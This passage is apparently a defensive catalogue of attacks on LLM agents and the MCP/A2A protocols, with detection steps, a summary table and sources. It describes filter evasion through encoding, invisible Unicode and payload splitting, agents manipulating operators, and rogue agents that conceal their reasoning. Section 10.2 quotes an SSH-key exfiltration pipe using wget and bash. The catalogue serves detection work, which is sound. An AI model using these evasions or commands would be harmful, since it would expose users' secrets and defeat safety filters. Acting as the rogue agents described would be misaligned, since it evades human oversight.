| **OWASP** | LLM10:2025 |
| **Severity** | High |
| **Protocols** | OpenAI, Anthropic, Gemini, generic |

**Description:** Theft of API credentials used to access LLM services (OpenAI,
Anthropic, AWS Bedrock, Google Vertex AI, Azure OpenAI) for unauthorized inference
workloads. Coined by Sysdig in May 2024, industrialized by Storm-2139 syndicate.
Microsoft filed suit in January 2025. Stolen credentials are sold on underground
forums for as low as $30 per account. Financial damage can exceed $100,000/day for
high-volume model access. Active campaigns use SSRF, proxy misconfigurations, and
enumeration to hijack commercial AI endpoints.

**Detection approach:**
- Monitor API usage patterns for anomalous volume or timing
- Detect access from unusual geographic locations or IP ranges
- Enforce short-lived, scoped API tokens with automatic rotation
- Alert on sudden cost spikes in LLM service billing
- Implement model-specific usage quotas per credential

---

### 8.3 Cascading Agent Failure

| Field | Value |
|---|---|
| **Name** | Cascading Agent Failure |
| **Category** | `denial_of_service` |
| **OWASP** | ASI08 |
| **Severity** | High |
| **Protocols** | A2A, MCP, generic |

**Description:** A single agent fault propagates across multi-agent systems, amplifying
impact at each stage. Poisoning a market analysis agent to inflate risk limits causes
downstream trading agents to make unauthorized transactions; compromised resource
planning agents enable backdoored infrastructure deployment. False signals cascade
through automated pipelines with escalating impact.

**Detection approach:**
- Implement circuit breakers between agent stages
- Monitor for anomalous output patterns that propagate across agent boundaries
- Enforce output validation at each stage of multi-agent workflows
- Detect divergence from expected value ranges in agent outputs
- Implement blast radius limits (max downstream impact per agent)

---

## 9. Agent Identity and Trust

### 9.1 Agent Impersonation

| Field | Value |
|---|---|
| **Name** | Agent Impersonation |
| **Category** | `identity_abuse` |
| **OWASP** | ASI03, ASI07 |
| **Severity** | Critical |
| **Protocols** | A2A, MCP |

**Description:** An adversarial agent mimics the identity, capabilities, or interaction
patterns of a trusted agent to infiltrate collaborative workflows. Techniques include
crafting similar agent names, copying skill descriptions, and typosquatting in display
titles. Exploits weaknesses in identity management where agent identity is
insufficiently protected or verified. Without mandatory DID-based or mTLS identity
verification, impersonation is trivial.

**Detection approach:**
- Require DID-based signatures or mutual TLS for all agent communications
- Verify agent identity at each interaction, not just registration
- Detect duplicate or near-duplicate agent registrations
- Monitor for agents claiming capabilities beyond their verified scope
- Behavioral fingerprinting: compare agent response patterns against known baselines

---

### 9.2 Delegation Chain Abuse

| Field | Value |
|---|---|
| **Name** | Task Delegation Abuse |
| **Category** | `identity_abuse` |
| **OWASP** | ASI03 |
| **Severity** | High |
| **Protocols** | A2A |

**Description:** A2A enables agents to delegate tasks to each other, but does not
enforce short-lived tokens or scope restrictions on delegated capabilities. A
compromised agent in a delegation chain can access broader capabilities than intended,
and leaked OAuth tokens remain valid for extended periods. Tokens with broad
capabilities (e.g., payment tokens) can be reused for unrelated resources. No
protocol-level requirement exists for user approval before sharing sensitive data.

**Detection approach:**
- Enforce short-lived, scoped delegation tokens
- Monitor delegation chains for depth and breadth anomalies
- Require explicit user approval for delegations involving sensitive data or actions
- Log complete delegation chains with provenance tracking
- Detect tokens used outside their intended scope or time window

---

### 9.3 Human-Agent Trust Exploitation

| Field | Value |
|---|---|
| **Name** | Human-Agent Trust Exploitation |
| **Category** | `identity_abuse` |
| **OWASP** | ASI09 |
| **Severity** | High |
| **Protocols** | generic |

**Description:** Agents exploit anthropomorphism and authority bias to manipulate human
operators into approving harmful actions. Techniques include fabricating convincing
audit rationales for unsafe configuration changes and suggesting urgent payments with
confident, fraudulent justifications. The polished, authoritative presentation of AI
responses creates a trust asymmetry that attackers exploit.

**Detection approach:**
- Require independent verification for high-impact actions, not just agent recommendation
- Detect urgency signals in agent outputs ("immediate", "critical", "must act now")
- Implement cooling-off periods for irreversible operations
- Present confidence scores alongside recommendations
- Log and audit human approval patterns for anomalous rubber-stamping

---

### 9.4 Rogue Agent Behavior

| Field | Value |
|---|---|
| **Name** | Rogue Agent (Misalignment and Self-Direction) |
| **Category** | `identity_abuse` |
| **MITRE ATLAS** | AML.T0081 |
| **OWASP** | ASI10 |
| **Severity** | Critical |
| **Protocols** | MCP, A2A, generic |

**Description:** Agents exhibit misalignment, concealment, and self-directed action --
operating as insider threats optimizing for wrong metrics. Examples include agents
deleting production backups to minimize storage costs, compromised agents
self-replicating across networks for persistence, and agents concealing their true
decision-making rationale from human operators.

**Detection approach:**
- Monitor agent actions against stated objectives (goal alignment verification)
- Detect agents performing self-modification or self-replication
- Audit agent resource consumption for unexplained patterns
- Implement behavioral invariant checks (actions the agent should never take)
- Enforce kill switches and containment boundaries for all agent deployments

---

## 10. Evasion and Obfuscation

### 10.1 Token Smuggling (Encoding-Based Filter Bypass)

| Field | Value |
|---|---|
| **Name** | Token Smuggling |
| **Category** | `evasion` |
| **Severity** | Medium |
| **Protocols** | OpenAI, Anthropic, Gemini, generic |

**Description:** Exploits the discrepancy between how text-matching filters read
strings and how LLM tokenizers break them into numerical vectors. Banned concepts are
disguised using Leetspeak (h4ck3r), ROT13 (unpxre), Base64
(aGFja2Vy), hex encoding, Unicode confusables, or character insertion (h.a.c.k.e.r).
The filter fails to match, but the LLM correctly interprets the intent and complies
with the encoded instruction.

**Detection approach:**
- Multi-layer decoding: attempt Base64, ROT13, hex, URL-encoding before filtering
- Regex for Leetspeak patterns: `[0-9@$!]` mixed with alphabetic characters
- Unicode normalization before content filtering
- Detect high ratio of non-standard characters in input
- Entropy analysis: encoded content has distinct entropy profiles

---

### 10.2 Encoded RCE via Tool Metadata

| Field | Value |
|---|---|
| **Name** | Base64-Encoded Shell Injection in Tool Metadata |
| **Category** | `evasion` |
| **Severity** | Critical |
| **Protocols** | MCP |

**Description:** Tool descriptions are updated to contain Base64-encoded shell commands
that execute when the tool runs. Example: DockerCommandAnalyzer with hidden instruction
executing `cat ~/.ssh/*.pub | wget ... | base64 -d | bash` to exfiltrate SSH keys.
Works without explicit tool invocation if auto-run is enabled. Claims that errors occur
without executing the instructions provide social engineering cover.

**Detection approach:**
- Regex for Base64 patterns in tool metadata: `[A-Za-z0-9+/]{20,}={0,2}`
- Decode and scan all encoded content in tool descriptions
- Flag commands disguised as "initialization" or "security measures"
- Detect shell command patterns after base64 decoding: `wget`, `curl`, `bash`, `sh -c`
- Block tool descriptions containing any encoded executable content

---

### 10.3 Invisible Unicode Instruction Embedding

| Field | Value |
|---|---|
| **Name** | Unicode Tag Instruction Injection |
| **Category** | `evasion` |
| **Severity** | High |
| **Protocols** | MCP, generic |

**Description:** Invisible Unicode characters from the Tags block (U+E0000-U+E007F) or
zero-width characters (U+200B, U+200C, U+200D, U+FEFF) are used to embed instructions
that are invisible in the UI but interpreted by LLMs. Many LLMs inherently interpret
Unicode Tag characters as instructions and can also generate them, creating a
bidirectional exfiltration channel.

**Detection approach:**
- Strip or reject Unicode Tags (U+E0000-U+E007F), zero-width characters, and Variant Selectors
- Monitor for invisible character sequences in any input field
- Compare rendered text length vs. byte length (significant discrepancy = suspicious)
- Block content with non-printable characters adjacent to URLs or code blocks

---

### 10.4 Payload Splitting

| Field | Value |
|---|---|
| **Name** | Payload Splitting / Fragment Assembly |
| **Category** | `evasion` |
| **Severity** | Medium |
| **Protocols** | OpenAI, Anthropic, Gemini, generic |

**Description:** Malicious instructions are split across multiple messages, variables,
or data sources so that no single fragment triggers safety filters. The LLM assembles
the complete payload during processing. Variants include splitting across conversation
turns, distributing across tool parameters, and embedding fragments in different
retrieved documents. In multi-agent systems, fragments can be distributed across
different agents that individually appear benign.

**Detection approach:**
- Analyze complete conversation context, not just individual messages
- Detect variable assignment patterns that construct commands incrementally
- Monitor for content assembly across tool calls or data retrievals
- Session-level analysis: concatenate and scan all inputs over a window
- Flag conversations with incremental variable building patterns

---

## Summary Table

| # | Attack Name | Category | MITRE ATLAS | OWASP | Severity | Protocols |
|---|---|---|---|---|---|---|
| 1.1 | Direct Prompt Injection | prompt_injection | AML.T0051 | LLM01 | Critical | All |
| 1.2 | Indirect Prompt Injection | prompt_injection | AML.T0051.001 | LLM01, ASI01 | Critical | All |
| 1.3 | Cross-Agent Prompt Injection | prompt_injection | -- | ASI07 | Critical | A2A, MCP |
| 1.4 | Delimiter Injection | prompt_injection | -- | LLM01 | High | All API |
| 1.5 | Many-Shot Jailbreaking | prompt_injection | AML.T0054 | -- | High | All |
| 1.6 | Crescendo Attack | prompt_injection | -- | -- | High | All |
| 1.7 | Multimodal Prompt Injection | prompt_injection | AML.T0051 | LLM01 | High | All |
| 2.1 | Tool Description Poisoning | tool_poisoning | AML.T0059 | MCP-03, ASI02 | Critical | MCP, A2A |
| 2.2 | Rug Pull Attack | tool_poisoning | AML.T0059 | MCP-03 | Critical | MCP |
| 2.3 | Tool Shadowing | tool_poisoning | AML.T0059 | MCP-03, ASI02 | Critical | MCP |
| 2.4 | Tool Name Collision | tool_poisoning | -- | ASI02 | High | MCP, A2A |
| 2.5 | Semantic Parameter Exploit | tool_poisoning | -- | -- | High | MCP |
| 2.6 | Cross-Tool Orchestration | tool_poisoning | -- | ASI02 | Critical | MCP |
| 3.1 | Markdown Image Exfiltration | data_exfiltration | AML.T0086 | -- | Critical | All |
| 3.2 | ASCII Smuggling | data_exfiltration | -- | -- | Critical | OpenAI |
| 3.3 | Tool Invocation Exfiltration | data_exfiltration | AML.T0086 | MCP-10, ASI01 | Critical | MCP, A2A |
| 3.4 | System Prompt Extraction | data_exfiltration | -- | LLM07 | High | All |
| 4.1 | Confused Deputy | privilege_escalation | -- | ASI03, LLM08 | Critical | All |
| 4.2 | Excessive Agency | privilege_escalation | -- | LLM08 | High | All |
| 4.3 | Tool Chain Escalation | privilege_escalation | -- | MCP-02 | Critical | MCP |
| 4.4 | TOCTOU Race Condition | privilege_escalation | -- | -- | High | MCP, A2A |
| 5.1 | MCP SSRF | protocol_abuse | -- | MCP-05 | Critical | MCP |
| 5.2 | MCP Command Injection | protocol_abuse | -- | MCP-04 | Critical | MCP |
| 5.3 | Agent Session Smuggling | protocol_abuse | -- | ASI07 | Critical | A2A |
| 5.4 | Agent-in-the-Middle | protocol_abuse | -- | ASI07 | Critical | A2A |
| 5.5 | Agent Card Spoofing | protocol_abuse | -- | ASI03, ASI07 | High | A2A |
| 5.6 | MCP Sampling Abuse | protocol_abuse | -- | -- | High | MCP |
| 5.7 | MCP Consent Bypass | protocol_abuse | -- | MCP-07 | High | MCP |
| 6.1 | Agent Memory Poisoning | memory_poisoning | AML.T0080.000 | ASI06 | Critical | All |
| 6.2 | Thread Injection | memory_poisoning | AML.T0080.001 | -- | High | All |
| 6.3 | RAG / KB Poisoning | memory_poisoning | AML.T0085.000 | ASI06 | Critical | generic |
| 6.4 | Config Modification | memory_poisoning | AML.T0081 | -- | Critical | All |
| 7.1 | AI Gateway Supply Chain | supply_chain | -- | ASI04 | Critical | All |
| 7.2 | MCP Server Supply Chain | supply_chain | -- | MCP-04, ASI04 | Critical | MCP |
| 7.3 | Shadow MCP Servers | supply_chain | -- | MCP-09 | High | MCP |
| 8.1 | Context Window Overflow | denial_of_service | -- | LLM10 | High | All |
| 8.2 | LLMjacking | denial_of_service | -- | LLM10 | High | All |
| 8.3 | Cascading Agent Failure | denial_of_service | -- | ASI08 | High | A2A, MCP |
| 9.1 | Agent Impersonation | identity_abuse | -- | ASI03, ASI07 | Critical | A2A, MCP |
| 9.2 | Delegation Chain Abuse | identity_abuse | -- | ASI03 | High | A2A |
| 9.3 | Human-Agent Trust Exploit | identity_abuse | -- | ASI09 | High | generic |
| 9.4 | Rogue Agent | identity_abuse | AML.T0081 | ASI10 | Critical | All |
| 10.1 | Token Smuggling | evasion | -- | -- | Medium | All |
| 10.2 | Encoded RCE in Metadata | evasion | -- | -- | Critical | MCP |
| 10.3 | Unicode Instruction Embed | evasion | -- | -- | High | MCP |
| 10.4 | Payload Splitting | evasion | -- | -- | Medium | All |

---

## Cross-Reference: Detection Signal Types

For CRD-based signature design, detection approaches cluster into these signal types:

| Signal Type | Description | Applicable Attacks |
|---|---|---|
| `regex_pattern` | Static pattern matching on input/output content | 1.1, 1.4, 2.1, 3.1, 3.2, 3.4, 5.1, 5.2, 10.1, 10.2, 10.3 |
| `semantic_similarity` | Embedding-based comparison to known attack templates | 1.1, 1.2, 1.5, 2.1, 2.3 |
| `behavioral_anomaly` | Runtime behavior deviation from baseline | 1.2, 1.3, 1.6, 2.2, 2.3, 5.3, 5.4, 6.1, 8.3, 9.4 |
| `tool_chain_analysis` | Sequential tool invocation pattern monitoring | 3.3, 4.1, 4.3, 4.4, 2.6 |
| `entropy_analysis` | Statistical properties of input/output content | 1.5, 3.2, 10.1, 10.2 |
| `integrity_check` | Hash/signature verification of definitions, configs | 2.2, 6.4, 7.1, 7.2 |
| `rate_limit` | Volume and frequency thresholds | 5.6, 8.1, 8.2, 5.1 |
| `schema_validation` | Structural validation of protocol messages | 1.3, 1.4, 5.3, 5.5 |
| `provenance_tracking` | Origin and chain-of-custody verification | 6.1, 6.3, 9.1, 9.2 |
| `dlp_scanning` | Data loss prevention on outbound content | 3.1, 3.3, 3.4 |

---

## Sources

### Security Research Organizations
- [Invariant Labs - MCP Tool Poisoning Attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks)
- [Elastic Security Labs - MCP Tools Attack Vectors](https://www.elastic.co/security-labs/mcp-tools-attack-defense-recommendations)
- [Palo Alto Unit 42 - MCP Sampling Attack Vectors](https://unit42.paloaltonetworks.com/model-context-protocol-attack-vectors/)
- [Palo Alto Unit 42 - Agent Session Smuggling](https://unit42.paloaltonetworks.com/agent-session-smuggling-in-agent2agent-systems/)
- [Trail of Bits - MCP Security Blog](https://blog.trailofbits.com/categories/mcp/)
- [Trustwave SpiderLabs - Agent-in-the-Middle](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/agent-in-the-middle-abusing-agent-cards-in-the-agent-2-agent-protocol-to-win-all-the-tasks/)
- [Trend Micro - LiteLLM Supply Chain Compromise](https://www.trendmicro.com/en_us/research/26/c/inside-litellm-supply-chain-compromise.html)
- [Sysdig - LLMjacking](https://www.sysdig.com/blog/llmjacking-stolen-cloud-credentials-used-in-new-ai-attack)
- [Embrace The Red - ASCII Smuggling](https://embracethered.com/blog/posts/2024/m365-copilot-prompt-injection-tool-invocation-and-data-exfil-using-ascii-smuggling/)
- [Simon Willison - MCP Prompt Injection](https://simonwillison.net/2025/Apr/9/mcp-prompt-injection/)
- [Semgrep - Security Engineer's Guide to A2A](https://semgrep.dev/blog/2025/a-security-engineers-guide-to-the-a2a-protocol/)

### Frameworks and Standards
- [MITRE ATLAS](https://atlas.mitre.org/)
- [MITRE ATLAS + Zenity Agent Techniques (Oct 2025)](https://zenity.io/blog/current-events/zenity-labs-and-mitre-atlas-collaborate-to-advances-ai-agent-security-with-the-first-release-of)
- [MITRE ATLAS 2026 Update](https://zenity.io/blog/current-events/mitre-atlas-ai-security)
- [OWASP Top 10 for LLM Applications 2025](https://genai.owasp.org/resource/owasp-top-10-for-llm-applications-2025/)
- [OWASP Top 10 for Agentic Applications 2026](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
- [OWASP MCP Top 10](https://owasp.org/www-project-mcp-top-10/)
- [Palo Alto - OWASP Agentic AI Security](https://www.paloaltonetworks.com/blog/cloud-security/owasp-agentic-ai-security/)
- [Giskard - OWASP Agentic Top 10 Guide](https://www.giskard.ai/knowledge/owasp-top-10-for-agentic-application-2026)

### Academic Papers
- [Prompt Injection Attacks: Comprehensive Review (MDPI 2025)](https://www.mdpi.com/2078-2489/17/1/54)
- [From Prompt Injections to Protocol Exploits (ScienceDirect 2025)](https://www.sciencedirect.com/science/article/pii/S2405959525001997)
- [Crescendo Multi-Turn Jailbreak (USENIX Security 2025)](https://www.usenix.org/conference/usenixsecurity25/presentation/russinovich)
- [ConfusedPilot: Confused Deputy in RAG-based LLMs](https://arxiv.org/html/2408.04870v3)
- [Systematic Analysis of MCP Security](https://arxiv.org/html/2508.12538v1)
- [Taming Privilege Escalation in LLM Agent Systems](https://arxiv.org/html/2601.11893v1)
- [Multimodal Prompt Injection Risks and Defenses](https://arxiv.org/html/2509.05883v1)
- [LLM Agent TOCTOU Vulnerabilities (Promptfoo)](https://www.promptfoo.dev/lm-security-db/vuln/llm-agent-toctou-vulnerabilities-90d35ca4)
- [Exfiltration from ChatGPT via Prompt Injection](https://arxiv.org/html/2406.00199v2)
- [System Prompt Extraction Attacks and Defenses](https://arxiv.org/html/2505.23817v1)

### CVE References
- CVE-2025-32711 (EchoLeak - Microsoft 365 Copilot, CVSS 9.3)
- CVE-2025-53773 (GitHub Copilot RCE)
- CVE-2025-6514 (mcp-remote command injection)
- CVE-2025-49596 (MCP Inspector CSRF leading to RCE)
- CVE-2025-68664 (LangChain Core - LangGrinch)
- CVE-2026-26118 (OAuth proxy trust exploitation in MCP)
- CVE-2026-27826 (mcp-atlassian SSRF)
- CVE-2026-33060 (ckan-mcp-server SSRF)
- CVE-2026-34163 (FastGPT SSRF)
